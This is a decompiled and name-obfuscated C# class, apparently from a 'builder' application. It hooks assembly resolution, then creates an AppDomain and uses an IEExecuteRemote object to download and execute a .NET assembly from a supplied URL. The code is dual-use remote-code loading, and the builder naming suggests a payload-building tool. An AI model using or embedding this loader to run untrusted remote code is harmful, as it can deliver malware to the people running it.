using System;
using System.Configuration.Assemblies;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Permissions;
using System.Security.Policy;
using System.Text;
using ForMe;
using ns1;

namespace ns0;

internal sealed class Class10
{
	static Class10()
	{
		AppDomain.CurrentDomain.AssemblyResolve += (object object_0, ResolveEventArgs resolveEventArgs_0) => mainBuilderForm.smethod_1(object_0, resolveEventArgs_0, out var assembly_) ? assembly_ : null;
	}

	public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
	{
		mainBuilderForm.smethod_2(byte_0, byte_1);
		return byte_0;
	}

	private static bool smethod_1(PermissionSet permissionSet_0)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		bool result = true;
		if (permissionSet_0 != null)
		{
			if (permissionSet_0.IsUnrestricted())
			{
				result = false;
			}
			else
			{
				SecurityPermission val = (SecurityPermission)permissionSet_0.GetPermission(typeof(SecurityPermission));
				if (val != null && (val.get_Flags() & SecurityPermissionFlag.BindingRedirects) != 0)
				{
					result = false;
				}
			}
		}
		return result;
	}

	internal static string smethod_2(string string_0)
	{
		string text = null;
		if (string_0 != null)
		{
			int num = string_0.IndexOf(':');
			if (num != -1 && num + 3 < string_0.Length && string_0[num + 1] == '/' && string_0[num + 2] == '/')
			{
				num += 3;
				int num2 = string_0.IndexOf('/', num);
				text = ((num2 <= -1) ? string_0.Substring(num) : string_0.Substring(num, num2 - num));
			}
			if (text == null)
			{
				text = string_0;
			}
		}
		return text;
	}

	internal static byte[] smethod_3(string string_0)
	{
		if (string_0 == null)
		{
			return new byte[0];
		}
		byte[] array = new byte[string_0.Length / 2];
		int num = 0;
		int num2 = 0;
		while (num < string_0.Length)
		{
			int num3 = smethod_4(string_0[num]);
			int num4 = smethod_4(string_0[num + 1]);
			array[num2] = (byte)(num3 | (num4 << 4));
			num += 2;
			num2++;
		}
		return array;
	}

	internal static int smethod_4(char char_0)
	{
		if (char_0 <= '9')
		{
			return char_0 - 48;
		}
		return char_0 - 65 + 10;
	}

	internal static int smethod_5(string[] string_0)
	{
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		string text = string_0[0];
		byte[] byte_ = null;
		int num = text.LastIndexOf("#", StringComparison.Ordinal);
		if ((num != -1) & (num != text.Length - 1))
		{
			string string_ = text.Substring(num + 1);
			text = text.Substring(0, num);
			byte_ = smethod_3(string_);
		}
		string text2 = null;
		int num2 = text.LastIndexOf('/');
		string applicationBase;
		if (num2 == -1)
		{
			applicationBase = text;
			text2 = text;
		}
		else
		{
			applicationBase = text.Substring(0, num2 + 1);
			if (num2 + 1 < text.Length)
			{
				text2 = text.Substring(num2 + 1);
			}
		}
		if (text2 != null)
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(text2);
			stringBuilder.Append(".config");
			text2 = stringBuilder.ToString();
		}
		string text3 = smethod_2(text);
		Evidence evidence = new Evidence();
		Zone val = Zone.CreateFromUrl(text);
		if ((int)val.get_SecurityZone() == 0)
		{
			evidence.AddHost(val);
		}
		if (text.Length >= 7 && string.Compare(text.Substring(0, 7), "file://", StringComparison.OrdinalIgnoreCase) == 0)
		{
			return 0;
		}
		evidence.AddHost(Site.CreateFromUrl(text));
		evidence.AddHost((object)new Url(text));
		AppDomainSetup appDomainSetup = new AppDomainSetup();
		if (smethod_1(SecurityManager.ResolvePolicy(evidence)))
		{
			appDomainSetup.set_DisallowBindingRedirects(true);
		}
		else
		{
			appDomainSetup.set_DisallowBindingRedirects(false);
		}
		appDomainSetup.set_ApplicationBase(applicationBase);
		appDomainSetup.set_PrivateBinPath(" ");
		if (text2 != null)
		{
			appDomainSetup.set_ConfigurationFile(text2);
		}
		AppDomain appDomain = AppDomain.CreateDomain(text3, evidence, appDomainSetup);
		if (appDomain != null)
		{
			AssemblyName name = Assembly.GetExecutingAssembly().GetName();
			AssemblyName assemblyName = new AssemblyName();
			assemblyName.Name = " ";
			assemblyName.SetPublicKey(name.GetPublicKey());
			assemblyName.Version = name.Version;
			assemblyName.CultureInfo = CultureInfo.InvariantCulture;
			appDomain.SetData(" ", text);
			ObjectHandle objectHandle = appDomain.CreateInstance(assemblyName.FullName, " ");
			if (objectHandle != null)
			{
				IEExecuteRemote iEExecuteRemote = (IEExecuteRemote)objectHandle.Unwrap();
				if (iEExecuteRemote != null)
				{
					int result = iEExecuteRemote.method_3(text, evidence, byte_, AssemblyHashAlgorithm.SHA1);
					Stream exception = iEExecuteRemote.Exception;
					if (exception != null)
					{
						throw (Exception)new BinaryFormatter().Deserialize(exception);
					}
					return result;
				}
			}
		}
		return -1;
	}

	[STAThread]
	private static void Main()
	{
		Program.Main();
	}
}
